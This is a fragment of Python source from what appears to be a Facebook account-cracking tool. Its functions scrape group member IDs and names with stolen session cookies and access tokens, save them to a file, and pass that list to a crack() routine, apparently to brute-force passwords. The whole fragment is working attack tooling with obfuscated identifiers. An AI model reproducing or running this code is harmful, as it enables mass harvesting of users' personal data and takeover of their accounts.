    def main_group(self, url_dev):
        bs=bs4.BeautifulSoup(_req_get_(url_dev,cookies=self.cookies,headers=self.header).text,"html.parser")
        for _cici_ in bs.find_all("a",href=True):
            if "/groups/" in _cici_.get("href"):
                if "category" in _cici_.get("href") or "create" in _cici_.get("href"):continue
                else:self.glist.append({"id":"".join(bs4.re.findall("/groups/(.*?)\?",_cici_.get("href"))),"name":_cici_.text})
        if len(self.glist) !=0:
            print("%s [%s•%s] %sYOU JOIN %s%s%s GROUP"%(H,P,H,K,O,len(self.glist),P));print('%s [%s1%s] %sSEARCH ALL GROUPS JOIN'%(H,P,H,K));print('%s [%s2%s] %sSEARCH GROUPS BY NAME'%(H,P,H,K));print('%s [%s3%s] %sSEARCH GROUPS BY ID'%(H,P,H,K))
            while True:
                c=_cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K));print('%s '%(O))
                if c=="":continue
                elif c=="1":self.saya()
                elif c=="2":self.search()
                elif c=="3":self.manual()
                else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        else:print("%s [%s•%s] %sYOU DON'T JOIN ANY GROUP"%(H,P,H,K));self.manual()
    def saya(self):
        self.fl=(self.id)
        try:os.remove(self.fl)
        except:pass
        print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
        try: 
            url = "https://graph.facebook.com/me/groups?access_token={}".format(self.token)
            with _req_ses_ as ses_:
                data = ses_.get(url).json()
                for _azimvau_ in data["data"]:
                    try:self._grup_.append(_azimvau_["id"])
                    except:pass
            for _cici_ in self._grup_:
                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
        except (KeyError,IOError):jalan('%s [%s!%s] %sCOOKIE INVALID'%(M,P,M,P));menu()
        except requests.exceptions.ConnectionError:jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));menu()
        except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
        except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def exec_grup_saya(self):
        global count
        with _req_ses_ as ses_:
            try:
                data = ses_.get(self.url_grup, cookies=self.cookies, headers=self.header).content;sop_dev = par(data, "html.parser");members = sop_dev.find("div", id="objects_container")
                for dev in members.find_all("table"):
                    user_ = dev["id"].replace("member_", "");nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                    try:_azimvau_dapunta_(self.fl,'a+').write(str(user_)+"•"+str(nama_)+"\n").close()
                    except:pass
                print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(self.fl).read().splitlines())), end=' ');sys.stdout.flush()
                if "See more" in str(sop_dev):url = sop_dev.find("a", string="See more")["href"];url_grup = "https://mbasic.facebook.com"+url;self.exec_grup_saya()
            except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari Grup Saya"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
            except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
    def manual(self):
        id=_cici_azimvau_("%s [%s•%s] %sENTER GROUP ID : "%(H,P,H,K))
        if id=="":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        else:
            r=bs4.BeautifulSoup(_req_get_("https://m.facebook.com/groups/"+id,headers=header_grup,cookies=self.cookies).text,"html.parser")
            if "no content" in r.find("title").text.lower():jalan('%s [%s!%s] %sPRIVATE GROUP / WRONG ID'%(M,P,M,P));menu()
            else:
                self.listed={"id":id,"name":r.find("title").text};self.f(id);print('%s '%(O));print("%s [%s•%s] %sNAME : %s"%(H,P,H,K,self.listed.get("name")));xd = _cici_azimvau_('%s [%s•%s] %sDump ID/Username? [i/u] : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K))
                if xd in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
                elif xd in ['i','I','1']:
                    try:self.dump_id("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sError Di Bagian : %s'%(M,P,M,P,_error_));_cici_cici_()
                elif xd in ['u','U','2']:
                    try:self.dump_username("https://m.facebook.com/groups/"+id);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID Dari %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM %s"%(H,P,H,K,len(_azimvau_dapunta_(self.fl).read().splitlines()),self.listed.get("name")));return crack(self.fl)
                    except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,M,_error_));_cici_cici_()
